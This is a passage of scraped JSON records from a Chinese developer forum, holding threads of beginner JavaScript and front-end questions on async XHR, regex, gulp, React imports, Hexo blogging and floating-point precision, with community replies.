也可以和普通的 value equaly 的 key 配合使用如 String 就是说也可以用作 cache ，但你需要很小心的使用，否则回收根本不可能起作用，因为这本来就不是设计场景", " js 本来残我承认， 7 天做出来的语言嘛。但 Weak 类可是最近这几年标准组搞出来的，起码参考一下现有 Weak 类的设计和使用场景吧。况且现在还有人觉得 JS 只是给网页做点花哨的小功能的玩具吗，没有什么理由认为在 JS 上不会出现其他语言出现的使用场景。", "ps: Java 有 WeakReference 只是这一种语言的实现而已， Python 的 Weak 类也没有 WeakReference ，不是一样可以实现。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，怎么强化自己的基础啊- -？？刷面试题吗？？<br><br>\n我觉得自己基础好像还凑合，但又不知道怎么客观评价自己的水平，所以来求解 0 0 ！蛤蛤！<br><br>\n[注]V2 什么时候正文编程 Markdown 语法了，，我说怎么有的帖子排版爆炸呢 0 0 ！</p>\n</div></div>"], "reply": "6", "tittle": "想问问有一定经验的前端开发者们，前端领域的基础扎实是什么样的呢？", "comment": ["我校招面试的时候被面试官评价说基础扎实。现在已入职。\r", "我的水平的话，\r", "就是 0 基础自学 1 年半。\r", "就是 w3school 上都“会用”，不考记性考悟性的那种。并用它们做了些网页放自己 Github 上。\r", "然后在刷面试题的过程中收获良多，并在自己的 github page 上写小结。\r", "当然实际面试的时候还是考记性，就看你练习够不够频繁了。\r", "\r", "v2 上早就支持 markdown 语法了。", " 都会用说大了。。。是 HTML 教程和 JavaScript 教程啊，别的初级前端还没几个机会用上。", "能不查资料敲代码，遇到没做过的能想到办法解决", "知乎上几乎一模一样的问题\r", " 好的俺看看", "看几大框架的源码，基本要求能看懂，进阶要求能用其中的思想在自己代码中，高级要求可以自己实现框架（不是简单模仿或者 xx 极简版，那玩意知道原理都能写）"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近用 gulp 有一事不明\n在 gulpfile 里定义了一个 task 之后</p>\n<p>由于 gulp.run 已经不能能用了，所以我们无法直接代码中执行这个 task 的</p>\n<p>代码中触发 task 的唯二的方法就是</p>\n<ol>\n<li>\n<p>gulp.watch 触发某个 /组 task</p>\n</li>\n<li>\n<p>gulp.task 前置依赖某个 /组 task ，然后在命令行中执行 gulp sometask 来执行那些 task</p>\n</li>\n</ol>\n<p>这是为什么呢？\n为什么不允许用户自行触发 task 呢？</p>\n</div></div>"], "reply": "5", "tittle": "为什么不能在代码中直接执行一个 gulp.task", "comment": ["可以用 gulp.start", " \r", "gulp.start 跟 gulp.run 一样....已经被官方弃用了，虽然你还是能使用", " 所以说 gulp4 大法好吗......", "把任务写成函数，这样可以用函数调用来代替 gulp.run 了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>代码是：\nfunction text(str){\nvar arr=[];\nvar text=document.getElementsByClassName(\"text\")[0];\nfor(var i=0;i&lt;str.length;i++){arr[i]=str[i];}\nvar p=document.createElement(\"p\");\ntext.appendChild(p);\nvar index=0;\nvar obj=setInterval(function(){\nif(index&lt;arr.length){\nvar text=document.createTextNode(arr[index]);\n}\np.appendChild(text);\nindex++;\n},200);</p>\n<p>}\nwindow.onload=function(){\ntext(\"我是打字机\");\t\n}\n如何在我是后面进行换行，然后打字机在第二行</p>\n</div></div>"], "reply": "9", "tittle": "js 打字机怎么换行", "comment": ["<br />", " 按照《 html5 撕逼团纲要》，你加了这个\"/\"是要处以极刑的 （滑稽.jpg", "  当年面试经历过 html4 xhtml 的区别的表示还是会习惯性加上 “/”，嘿嘿...", "话说你代码的换行呢？\r", "\r", "添加一个 br element 就换行了。。。", "说添加 br 仔细瞧下代码", "加个标识符比如 !-! 用于分割 text 然后把分割后的数组每打印一个项就输出一个换行", "\\n", "可以参考一下我的 Typinyin.js\r", "```\r", "        var obj = setInterval(function() {\r", "            if (index < arr.length) {\r", "                var text = document.createTextNode(arr[index]);\r", "            \tp.appendChild(text);\r", "            }\r", "            index++;\r", "        }, 200);\r", "```\r", "\r", "`a.appendChild(text)` 必须包含在 if 判断中，否则会报错。\r", "同时没有写定时器的结束标识，这个定时器没有被释放。\r", "\r", "换行功能建议配置换行表示，将字符串按要求分割打印。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>正在学习一个 Meteor 的官方范例（ <a href=\"https://www.meteor.com/tutorials/react/components\" rel=\"nofollow\">https://www.meteor.com/tutorials/react/components</a> ），</p>\n<p>看到这段代码（ client/main.jsx ）：</p>\n<pre><code>import React from 'react';\nimport { Meteor } from 'meteor/meteor';\nimport { render } from 'react-dom';\n \nimport App from '../imports/ui/App.jsx';\n \nMeteor.startup(() =&gt; {\n  render(&lt;App /&gt;, document.getElementById('render-target'));\n});\n</code></pre>\n<p>这里整段代码中都没有用到 <strong>React</strong> ，不知为何要用 import React from 'react'; 导入 React ？\n小菜鸟理解不了，还请大牛释疑，谢谢。</p>\n</div></div>"], "reply": "2", "tittle": "看官方范例不解，未用到的模块为何要导入？", "comment": ["现在看起来好像是没用到 react ，主要是由于实例化 App 这个 react component 使用了 jsx ，但在 js 中 jsx 是不被支持的，因此 jsx 最终需要转化成 js 的代码（一般会通过 babel 来转），这里的 <App /> 会被转成 React.createElement(App)，你看，这时需要 React 了吧。", " 终于懂了，谢谢指点，自己想破脑袋都想不明白，有指点一下就明白了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>小菜鸟在看这篇教程： <a href=\"https://www.meteor.com/tutorials/react/update-and-remove\" rel=\"nofollow\">https://www.meteor.com/tutorials/react/update-and-remove</a></p>\n<p>代码片段如下：</p>\n<pre><code>toggleChecked() {\n  Tasks.update(this.props.task._id, {\n    $set: { checked: !this.props.task.checked },\n  });\n}\n&lt;button className=\"delete\" onClick={this.deleteThisTask.bind(this)}&gt;\n  &amp;times;\n&lt;/button&gt;\n</code></pre>\n<p>请问这里突然出现的“$set ”和“&amp;times ”是怎么来的（前文无预先定义）？我应该去哪里学习相关的知识点？\n还有一个疑问，这里的 bind()方法是谁提供的？ JS 原生？还是 React 提供？为何还要传入一个 this ？</p>\n<p>还请帮忙指点小菜鸟，谢谢。</p>\n</div></div>"], "reply": "7", "tittle": "请教：代码中出现的“$set”和“&times”是什么东东？", "comment": ["&times 是 HTML 的符号（其实是乘号），看起来像 x\r", "\r", "\r", "$set 则是 React 里的", "$set 只是 JSON 的 key ，不是一个变量； &times; 是 HTML entities ， 参见这个表格 ", "\r", "\r", "bind 是 js 原生语法，多读一些 js 的书里有具体解释。", "使用 bind 的原因是涉及 js 的作用域，这个是一个难点（敲黑板）", "谢谢各位老大指点，又学到了黑科技，谢谢。", "那个$set 十有八九是 immutable update 的方法，应该是 react update helper ，具体也可以参考我的一个类似的库： ", "\r", "\r", "react 的 update helper 的文档没这么详细： ", "$set 应该是 Task 的，类比 node mongo 里的 update 方法，就是用$set 来表示要更新的字段和值", " 那 Task 是谁的？"]},
{"content": ["<div class=\"topic_content\">//具体代码：\r<br>var listArr\r<br>var getList = new XMLHttpRequest();\r<br>getList.onreadystatechange = function () {\r<br>\tif (getList.readyState == 4 &amp;&amp; getList.status == 200) {\r<br>\t\tvar listObj = JSON.parse(getList.responseText);\r<br>\t\tlistArr = listObj;\r<br>\t\tconsole.log(listArr);\t//此处输出的是 XHR 获得的内容\r<br>\t}\r<br>};\r<br>getList.open(\"GET\", \"list.json\", true);\r<br>getList.send();\r<br>console.log(listArr);\t//此处输出 undefined</div>", "<div class=\"topic_content\">问题确实出在 XHP 异步，那么问题改成“怎样把 XHR 获得的数据输出到全局变量？”。\r<br>除了将 async:false 还有别的方法吗？</div>"], "reply": "17", "tittle": "JS 怎么将 function 中的局部变量输出到全局变量", "comment": ["这哪是局部变量还是全局变量， xhr 是异步的你 send 之后代码又不会停住等你取结果。", "楼主需要理解一下 js 中的异步操作是什么意思", " 嗯，那么要怎样实现我想要的功能，可以给个思路吗？", "这个应该已经是全局了吧。然而重点在于异步的话， log 的时候并没有执行到赋值的地方呢", "xhr 是基于事件来处理结果的，也就是 xhr 会在拿到结果之后，调用你绑定的事件监听函数。", " getList.open(\"GET\", \"list.json\", false);", "xhr 可以用 async:false 但这是 deprecated 的功能用了是自寻死路，还是老老实实去学一下怎么用异步吧", "function nextStep(result){console.log(result)}\r", "\r", "getList.onreadystatechange = function () {\r", "……\r", "nextStep(listArr)\r", "……}", " 这样的话 listArr 就变成 nextStep 的局部变量了。。", " 局部变量是相对的, 如果一个变量 a 可以在 function b 里总是取的到 你就可以把他当作类似全局的来用呀.", "你已经将 xhr 的结果输出到全局变量了。\r", "之所以你得到了 undefined ，是因为你在 xhr 获得结果并将结果赋值给 listArr 之前访问了全局变量 listArr", "这和全局变量，局部变量没关系。是异步的问题。。", "给 onreadystatechange 的处理函数一个回调参数，把你的操作挪到回调函数里去", "首先第一行应该是  [listArr = 1;]  之后可以看到 listArr 是否改变。\r", "其次既然是全局的， var 就可以省略了。\r", "最后所有语句都执行完成后，在浏览器控制台再次运行  [console.log(listArr);] ", "为什么一定要附到全局上呢  看你的需求不需要这么做啊  你只是不懂异步  要搞清楚 js 中蛋疼的流程控制", "用回调函数解决.", "。。。随便找本小书看看。。编程不是靠猜的。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想把网站的图片展示做成像链家手机 app 查看房屋图片的那种效果：主页单张显示，自动轮播或滑动看前后图片，点击单张图片后通过手势操作可放大缩小，滑动可看下一张或前一张，点击图片后回到主页。 iSlider 的对图片列表的轮播功能比较好，但是点击放大的展示效果不好，并且放大后就不能轮播了。而 PhotoSwipe或者lightbox 则相反，我想把iSlider和后两个中的一个组合在一起用，不知道有没有人尝试过？还是有哪一个插件可以解决我的这些需求的，找了好久没找到合适的，求助。</p>\n</div></div>"], "reply": "2", "tittle": "有没有对图片轮播插件比较了解的？", "comment": ["试试这个： ", "  \r", "可以点击图片放大，左右浏览  \r", "可以再自己定义其它动作  \r", "doc 地址： ", "  弄了一天，最后通过把 FlexSlider 和 lightGallery 组合起来使用解决了这个问题。但还是要谢谢你的热心回答！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有一字符串， 类似 这样\" as das\"</p>\n<p>要求去掉第一位的空格，保留字母之间的空格</p>\n<p>应该怎样写？</p>\n<p>我写的这个不太 work:  /(^\\s)\"/g</p>\n</div></div>", "<div class=\"topic_content\">实际上我要处理的字符串是这样 ：（空格）（引号）字符（空格）（引号）\r<br>\r<br>例如： ' \"asu i dh iu\"’    输出 ：‘ asu i dh iu ’\r<br>\r<br>目前的解决方法是用两次正则\r<br>\r<br>如何一次实现呢？</div>", "<div class=\"topic_content\">手误，输出是这样\r<br>\r<br>‘ asu i dh iu ’</div>", "<div class=\"topic_content\">v2 自动给加了空格。。。</div>"], "reply": "13", "tittle": "正则表达的疑问，求老司机带带", "comment": ["/^\\s*/", "LTrim 函数可删除字符串左侧的空格。", "String.prototype.trim()\r", "\r", "MDN ： ", "参考 零宽度正回顾后发断言\r", "(?<=\\s?).*\r", "\" asd asff\" 匹配 \"asd asff\"", " 看看 append", " \r", " \r", " \r", "看看 append", "为什么要用正则……自己写个 trim 的函数不就好了……", "没看懂 append ……\r", "意思是`\"_asu_i_dh_iu\"`变成`\"asu_i_dh_iu\"`？（下划线替换成空格）\r", "``` javascript\r", "'\"_asu_i_dh_iu\"'.replace(/^\"_+/, '\"'); // 下划线替换成空格\r", "```", "```\r", "'_\"asu_i_dh_iu\"' -> 'asu_i_dh_iu' :\r", "(?<=\").*(?=\")\r", "\r", "'_\"_asu_i_dh_iu\"' -> 'asu_i_dh_iu' :\r", "(?<=\"_).*(?=\")\r", "\r", "'_\"asu_i_dh_iu_\"_' -> 'asu_i_dh_iu' :\r", "(?<=\"_).*(?=_\")\r", "```\r", "\r", "注: 将所有下划线替换为空格, 字符串不包括单引号", "回复怎么用代码格式啊...?\r", " 请问完整的表达式是怎样的啊？ 我知道的是类似这样的结构的 /..../.", " 不太清楚你用的啥语言... 我用的 ", " 这软件", "trim 不就好了?"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://www.jq22.com/demo/jQueryoverScroll20151015/\" rel=\"nofollow\">http://www.jq22.com/demo/jQueryoverScroll20151015/</a>\r<br>是一个 jQuery overScroll 的图片插件，很漂亮，想用来做相册导航但不能鼠标跟随。\r<br>\r<br><a target=\"_blank\" href=\"http://www.17sucai.com/pins/demoshow/386\" rel=\"nofollow\">http://www.17sucai.com/pins/demoshow/386</a>\r<br>是鼠标跟随滚动。坐电脑前弄了两天了，也没弄好，眼睛都花了。\r<br>\r<br>想问问有没有人能教我一些方法或技巧来弄它，我真的是不行了 /或者有没有现成的这种 js 。我不会写 js ，只能看懂简单的 js 来修改，显然这个已经超出我的能力范围，帮帮我吧，万分感谢。。。</div>"], "reply": "18", "tittle": "怎么能把这两个 js 功能合并，满头大汗的求问。", "comment": ["为什么发到 java 里", "发错地方了是吧。不好意思。我对分类有点迷惑，应该发到哪里？我现在应该怎么办？", "我知道了，应该发到 jquery 里。可是我在节点导航里没找到 jquery 啊。现在改怎么办？", "如果不会 js ，就在已有插件里找合适的，搜 image slider 有一堆", " 谢谢。知道发错了。\r", " 我以为那个鼠标跟随的 js 只有几行代码，应该能合并上，只是在 css 上看花了眼。因为需要这样的东西，才要强行合并的，要不我就用别的了。依然谢谢你的建议。", " 因为是 java script 😂", "假设你用了第一个网址上面的插件，你可以监听 图片的 hover 事件，触发它的 click 。\r", "像第一个网址，你可以在试着在 console 里执行一下这个代码看看效果\r", "$('#container2 > img').hover(function(){$(this).click()})；", " \r", "$('#container2 > img').hover(function(){$(this).click()})；\r", "SyntaxError: Unexpected token ILLEGAL\r", "message: \"Unexpected token ILLEGAL\"\r", "stack: (...)\r", "get stack: function () { [native code] }\r", "set stack: function () { [native code] }\r", "__proto__: Error\r", "\r", "是不是我的姿势不对，我是用浏览器浏览第一个网址的 console 里输入的。\r", "\r", "我觉得现在最大的问题是焦点问题，我在删除某些 css 后，能左右动但没有焦点，这么说你能理解？", " ", "\r", "Javascript is not Java", " 刚刚用了中文输入法，你把分号去掉或者换成英语的分号再试一下", " 别生气，都是我的错，下回不会这样了。", " 没生气啊，只是通知管理员移动而已。\r", "\r", "不过我有些时候确实语气有点问题，得想办法改改了。", " 哇塞好神奇，我能这么理解吗，你是让鼠标在图片上变成点击了吗？\r", "这让我很为难。看似达到了效果，可是和第二个网址功能差别很大，由于第一个网址是被点击的图片就到中间位置了，如果鼠标不在中间位置，图片理论上就会不停的转，直到最后。我想做在页面底下当小图片目录，上面是大图，因为一次可能要载入上百张小图，所以才想这么弄的。\r", "还有其他捷径可以指点指点吗？", "Java 与 JavaScript\r", "雷锋 与 雷峰塔", "放弃，用更简单直接的方法吧。这两个要较完美结合起来还是需要一定编码的。", "继续找下你要的效果吧，不要考虑整合了。\r", "整合两个的话，更需要功底，也更花功夫。", "难道不是在 hover 到 jQuery overScroll 的图片上的时候去执行以下 coverscroll('next')或者 coverscroll('prev') 吗? \r", "最多就是判断以下当前的 img 与 hover 的 img 的索引大小关系", " \r", " \r", " \r", " \r", "\r", "谢谢大家。我想要的功能好像真的不是这两个插件整合就可以的，也整合不了。\r", "第一个网址的功能是点击后焦点图片就到正中央了。而我需要的是焦点是鼠标，鼠标到哪里，哪里的图片就最大，而不是跳到中央。。\r", "还得请大家给个建议，是重新找个别的方案，还是继续弄第一个网址的插件来实现。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>var webPage = require('webpage');\nvar page = webPage.create();\n\npage.open('http://www.qq.com', function (status) {\n    var url = page.url;\n    console.log('URL: ' + url, status);\n    phantom.exit();\n});\n\n</code></pre>\n<p>执行这段代码会遇到下面的错误，同样的代码在 Ubuntu 上执行是没有问题的</p>\n<pre><code>TypeError: undefined is not an object (evaluating 'urlOrTitle.length')\n\n  undefined:1 in _cutUrlToShort\n  :1\n\n</code></pre>\n<p>各位有遇到过同样的问题吗？</p>\n</div></div>"], "reply": "9", "tittle": "在 Mac 使用 Phantomjs 遇到一个问题", "comment": ["别用 phantomjs 了，快加入 casperjs 的怀抱", "查看下 node 版本", " casperjs 要依赖 phantom 该出错错还是出错", " \r", " \r", "\r", "是啊  试了下 casperjs 还是同样的问题", "搞个反代，把出错代码给注释掉", " \r", "\r", "v5.10.1", "从 phantomjs 官网下重新下一个如何", " \r", "从各种途径重新安装过，都不行\r", "\r", "homebrew npm 官网 都试过了  相同的情况", "可以 StackOverflow 问，贴个链接我来答……"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>需要遍历一个数组(内容作为参数)执行 ajax..  需要挨个执行完成以后再执行下一个... 看了下 jquery 的 Deferred 自己试着写了个:<br>\n<a href=\"https://jsfiddle.net/6ayeq7hy/\" rel=\"nofollow\">https://jsfiddle.net/6ayeq7hy/</a></p>\n<p>但是没达到理想的效果,执行顺序是这样的:</p>\n<pre><code>加载遮罩层\n1 开始执行\n2 开始执行\n3 开始执行\n4 开始执行\n5 开始执行\n6 开始执行\n1 执行完成\n2 执行完成\n3 执行完成\n4 执行完成\n5 执行完成\n6 执行完成\najax 全部执行完成,关闭遮罩层\n</code></pre>\n<p>需要达到以下效果:</p>\n<pre><code>加载遮罩层\n1 开始执行\n1 执行完成\n2 开始执行\n2 执行完成\n3 开始执行\n3 执行完成\n4 开始执行\n4 执行完成\n5 开始执行\n5 执行完成\n6 开始执行\n6 执行完成\najax 全部执行完成,关闭遮罩层\n</code></pre>\n</div></div>"], "reply": "8", "tittle": "关于 ajax 循环执行顺序的问题", "comment": ["async: false", " 除了这个呢... 同步连 gif 图片都会卡死...", "异步问题，一般都找 async.js 搞定呗", "\r", "你需要把每个 deferred 串起来才行，直接 deferred 数组是一个并行操作来的。", "```javascript\r", "[1, 2, 3, 4, 5].reduce((prev, curr) => {\r", "  prev.then($.get(`xxx.json?id=${curr}`); // then 里面还可以添加自己的逻辑\r", "  return prev;\r", "}, Promise.resolve());\r", "```", "你的写法是并发队列\r", "是应该像 3 楼那样变成串行队列来执行"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看到酷开 TV 的论坛有个功能可以输入视频链接，然后推送到局域网的电视上。\n<a href=\"http://bbs.coocaa.com/#pushToTv\" rel=\"nofollow\">http://bbs.coocaa.com/#pushToTv</a></p>\n</div></div>"], "reply": "2", "tittle": "JS 有办法获取局域网中的 DLNA 设备？", "comment": ["自制的协议，需要客户端配合", "人家客户端和服务器同步信息而已；\r", "也有是客户端上开了个 http 接口，然后盒子的 ip 之类的通过服务器同步到你的页面，然后页面就能 http 跟盒子通信了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我是在 ajax 的回调函数里调用 eval 运行所需要的 js 代码，偶然中发现，回调代码中有第二层的 eval ，会导致第二层的 javascript 让 chrome 无法识别？</p>\n<p>很奇怪的限制，猜想也许和 V8 有关，不知道别的浏览器如何，没试过，呵呵。</p>\n</div></div>"], "reply": "3", "tittle": "为什么在 chrome 里， eval 函数不能镶嵌运行呢？也就是 eval 里的代码，有第二层的 eval，然后又有第三层的 eval.", "comment": ["比如說 eval('3 + eval(\"5 + 1\")') 這樣的麼？我的 Chrome 出來是 9 ，看起來沒錯。", "要运行一点复杂的调用代码、比如额外的函数框架调用之类的。", "eval('3 + eval(eval(\\'1+1\\')+2)')\r", "7"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Hexo 博客折腾的有段时间了，最近为 Next 主题添加了哈林摇特效。同学们来玩玩呗： <a href=\"http://www.iamlj.com/\" rel=\"nofollow\">http://www.iamlj.com/</a></p>\n<p>虽然这个特效早出来了，但加完后感觉效果还不错，附带教程： <a href=\"http://www.iamlj.com/2016/08/add-special-effect-harlem-shake-for-hexo/\" rel=\"nofollow\">http://www.iamlj.com/2016/08/add-special-effect-harlem-shake-for-hexo/</a></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>@shizhouren，我的博客采用的是<a href=\"https://github.com/hexojs/hexo\" rel=\"nofollow\">Hexo</a>的<a href=\"https://github.com/iissnan/hexo-theme-next/\" rel=\"nofollow\">Next主题</a>搭建的。\n给想搭建的同学们，推荐几篇入门文章：</p>\n<ul>\n<li>搭建Hexo博客：<a href=\"http://www.jianshu.com/p/05289a4bc8b2/\" rel=\"nofollow\">如何搭建一个独立博客——简明Github Pages与Hexo教程 - 简书</a></li>\n<li>Hexo主题挑选：<a href=\"https://www.zhihu.com/question/24422335\" rel=\"nofollow\">有哪些好看的 Hexo 主题？</a></li>\n<li>Next主题基础配置：<a href=\"http://theme-next.iissnan.com/\" rel=\"nofollow\">Next使用文档</a></li>\n</ul>\n<p>我在博客基础上，自己加了一些修改，后面看需要再更新几个Hexo小教程吧。譬如Next主题加宽，多站部署，非www的重定向，seo的sitemap和cdn优化。教程基本上偏简单，自己捣鼓捣鼓也能整出来。贴出教程也希望能节省大家捣鼓的时间。</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>关于打开速度慢和多站部署的问题。</p>\n<p><strong>打开速度慢</strong>，一个是因为需要加载的js和css远程连接过多；一个是不同地区cdn访问速度不一，解决办法：采用多站部署。</p>\n<p><strong>多站部署</strong>，贴一个我参考过的教程<a href=\"http://opiece.me/2015/04/28/push-hexo-to-github-and-gitcafe/?utm_source=tuicool&amp;utm_medium=referral\" rel=\"nofollow\">将hexo博客同时托管到github和gitcafe</a>，有一定参考性。时间久远了，部分信息也不实用了，譬如gitcafe已经被coding.net收了...</p>\n<p><strong>我的发布代码</strong>，发布到了4个地方，虽然站点多，不过发布速度还是很快的。<strong>现在主要用coding和github，对应国内和国外访问</strong>。</p>\n<pre><code>deploy:\n  type: git\n  repo: \n    sae: https://git.sinacloud.com/iamlj,1\n    coding: https://git.coding.net/iamlj/iamlj.git,coding-pages # 暂时先关闭，转用速度更快的sae，等sae没钱了，再用coding\n    github: https://github.com/shliujing/shliujing.github.io.git,master\n    iamlj: git@121.42.61.155:hexo.git,master\n</code></pre>\n<p>最后，感谢@nolotus提供的免费空间，我试ping了不同地区，速度基本github差不多，这里我就不折腾了。</p>\n</div></div>"], "reply": "45", "tittle": "个人 Hexo 博客 Next 主题的哈林摇特效", "comment": ["楼主博客干货蛮多的，赞一个", " 主要是应大家需求，有需要就分享~写的也比较简单，哈哈。", "您所访问的网站发生故障！", "金克拉已瞎 - -", "666", "没介绍一下怎么搭建这样一个博客 啊\r", "用网上的教程都有意外错误", "我昨天弄了个换肤功能，无奈新加的 css 有 Bug 懒得调了。。", " 干货很多+1", " 国内访问我用的 sae ，设置有流量的云豆预算，访问失败是因为超过预算了。\r", "现在考虑国内访问还是放到免费的空间吧，比如 ", " 或者个人服务器，相对 saesae 的 cdn 访问速度会慢点。", "哈哈哈哈哈哈哈哈哈哈\r", "我以为再点一次 high 就能关了特效...............\r", "哈哈哈哈哈哈哈哈哈哈", "炫酷", "先 mark ，周末有空再折腾下。\r", "next 这主题真是多人用。", "感谢分享。打不开。。。", " 分享到 V2EX ，一下访问起来。 sae 不给力 - >coding.net 不给力，现在正切回 github...", "就是 high 一下？这个不是早有了\r", " 点击越多动感越强。。。", "这个好，楼主的站里有很多小东西很实用，谢谢了", "另外，请教一下， hexo 能不能布置到国内或者香港的服务器？域名没备案\r", "\r", "放到 github 有的时候访问速度还是有点慢", "打不开", "然而 404 了", "404 page not found", " 看样子博主也是得翻墙能进，我这里能进", " 。\r", "我也是从别处通过教程学习，然后添加的~\r", "你的博客 High 我体验了，起始音乐很奇妙 0 0 ，要是后面动感节奏还能对上那就绝了！", " 我这提供 hexo 的免费托管", "楼主，要不试试我这里，托管在香港～", "页面有点卡", "为什么我想笑", " 刚才还在搞怎么加网易云音乐那个，然后就给我报错了，还没找到啥原因，不知道你遇到过没，有帖子说是 html 生成的时候出现的问题，但是我把 div 都干掉了，还是报错，忧伤。。\r", "[error]( ", ")", "卧槽！ 好 High ", " ", " 看你的报错，应该是 post 里有解析不了的标签。\r", "你本地有做 git 版本控制吗？比对下看哪里出错了。\r", "我一般都是几个文件 commit 一次，然后写好 log 。\r", "最好养成这个习惯。", "嗨爆了 LOL ！！", " 我是文件和环境分开的，我在本地写 md 文件，然后传到 github ，之后在放到 vps 上 hexo d -g 解析到 github 上，文件的话在本地貌似是看不出有什么问题。 vps 上只有这个报错", "哈哈哈哈 收藏了", " 。如果你在 vps 上 deploy ，解析 md 文件报错。\r", "说明错误是在 md 文件上，前提：你确保 vps 上的 hexo 或 themes 你未作配置上的修改？\r", "总之我觉得问题应该是在 md 文件上。你试试把最近 commit 的 md 文件去掉看看，我经常报的错是使用 Sublime 写 md 文件， Shift+F9 预览时在_posts 文件夹，会生成 html 文件，导致博客排版错乱。", "黑人问号。。。", "不错，支持下", " 是啊，我就是 sublime 写的， vps 上的好久没修改过了， md 文件就差直接删除了，文件都被我修改完了。", "笑死我了", "😄在 coolshell 见过", "这段 JS 前年就被玩烂了，至今都躺在我的收藏夹", "楼主，你的博客的搜索是用的什么？\r", "之前看有的说用 SwiftType ，但是没成功，就作罢了", " ，我用的是 local search ： ", "这个特效早些年见得多些，最近倒是好久没见到了。。不过每次听都很带感\r", "楼主的博客 Hexo 的干货很多，赞一个。最近也打算把从 WordPress 迁移到 Hexo 的全过程和踩坑记录整理出来，懒癌犯了，缓慢更新。。。看到楼主的一些思路发现确实有好多不同的玩法\r", "\r", " SwiftType 现在是过期不付费保留一定天数就删账户，从加载速度和成本上看，还是用 hexo-generator-search 来的靠谱，需要做的只是手写个合适的静态页或 ajax 请求", "卧槽，简直是鬼畜摇啊，配合博主头像一起摇效果绝佳~  23333", "楼主看看这个 "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>已经在 github 上找了，只有 jquery 还有其它框架的代码， js 本身的代码在那里维护呢，觉得应该是 MDN 在搞，但是搜了下没找到，球大神指教</p>\n</div></div>"], "reply": "14", "tittle": "js 的源码在哪里呢", "comment": [" 这是标准\r", " 这是谷歌的实现", "所以说， JS 不是一种语言？", "只看题目真是莫名其妙= =", "所以说 C++， Java ， Python ， PHP 的源码在哪里呢？", " 和前两个对比还可以，后两个都有标准实现吧", "  这种问题难以想象会出现在 V2EX ；\r", "楼主指的应该是 js 解释和执行引擎的源码，不是 ES 标准文件，这个每个浏览器都有自己的实现，现在 V8 和 ChakraCore 都是开源的。", "js 没有源码，只有语言标准。", "你需要找的是 js 引擎的源码， v8 是可以找到的。", "这些委员会都是只指定标准，不管实现的。具体实现是不同厂家（ vendor ）的事情，保证 API 兼容即可。", "v8 ？", "只知道引擎   是我知识和姿势不够么", "js 是语言啊，你想问的是解释器在哪里吧；解释器由浏览器开发者实现。", " 不過為了避免歧義，還是稱為 CPython 比較好", "大家已解（ pen ）释完，我就不再说什么了。", "基本都是 C++写的，你还要看吗"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>var a = 0.05<br>\na += 0.01</p>\n<p>这时候 a 会等于 0.060000000000000000000005</p>\n</div></div>", "<div class=\"topic_content\">新手入门学艺不精，多谢大家指点</div>"], "reply": "45", "tittle": "为毛 JS 的浮点这么鬼畜的啊", "comment": ["二进制保存小数问题，基本上编程语言都有类似的问题", "JS 是双精度浮点数，用的 IEEE754 ，因而浮点数数值计算本来就不可能精确", "因为浮点数是实数的近似表示。计算的时候就会产生误差。跟具体什么语言没有关系。\r", "\r", "C 里面可以自己决定使用 32 位的 float 或 64 位的 double ， python 默认都是 64 位的浮点数。\r", "\r", "定义一个 double d = 0.1 ，再 printf(\"%.20lf\", d)，就可以知道浮点数是无法准确表示 0.1 的。", "跟语言没关系", "和语言没关系", "js 日常背锅", "In [1]: a = 0.05\r", "\r", "In [2]: b = 0.01\r", "\r", "In [3]: a + b\r", "Out[3]: 0.060000000000000005\r", "\r", "Python 表示这个锅有 js 帮背，真舒坦", "心痛 js", "日常背锅", "Js 表示虽然我设计的差 但真不是我的锅啊", "楼主找 block 么", "自己计算机基础都没学好，还怪 js", "我用 PHP 无法还原这个过程，不知什么原因。\r", "<?php\r", "$a = 0.05;\r", "$a += 0.01;\r", "echo $a;\r", "?>\r", "输出： 0.06", " 因为转成十进制字符串的保留小数位数不同……\r", "\r", "LZ 标题都说 JS 的“浮点”（而不是官方听起来有些模糊的“数字” Number ）了，还说这些难道是钓鱼？\r", "这钩也太直了吧。", " 如果数值大一些， PHP 也可以出现类似现象，鸟哥在他的博客有解释： ", "\r", "\r", "如果说这帖子是钓鱼的话，只能说钩直饵咸。", " \r", "<?php\r", "$a = 1.002;\r", "$a -= 1.001;\r", "echo $a;\r", "?>", "不知道你有没有听说过一个网站:\r", " 这个确实可以，但 LZ 这个用 PHP 怎么试都还原不出来，我尝试加大小数位数都不能复现。\r", "原因不明。", " 看了你这个链接之后用 PHP 复现成功。\r", "<?php\r", "ini_set('precision', 17);\r", "$a = 0.05;\r", "$a += 0.01;\r", "echo $a;\r", "?>\r", "\r", "官方的解释： ", "\r", "浮点数中显示有效数字的位数。\r", "\r", "我看了下， PHP7 的默认值是 14.", " PHP 不是很熟哦. 不过你一说我突然想起来, 当时 PHP 这段我把我看笑了. PHP 居然如此机智的避开了这个问题.", "心疼 js", " 是的，这个 precision 默认值在 php.ini 里。", "不如认真读一下 csapp", "0.01 和 0.05 都是二进制下的无限循环小数，没法用 64 bit 表示\r", "所以只能作为双精度浮点数存在\r", "\r", "0.01 表示为 0x3f847ae147ae147b, 也就是二进制的 1.0100011110101110000101000111101011100001010001111011 * 2^-7\r", "\r", "0.05 表示为 0x3fa999999999999a, 也就是二进制的 1.1001100110011001100110011001100110011001100110011010 * 2^-5\r", "\r", "用竖式加起来\r", "\r", "1.111010111000010100011110101110000101000111101011100011 * 2^-5\r", "\r", 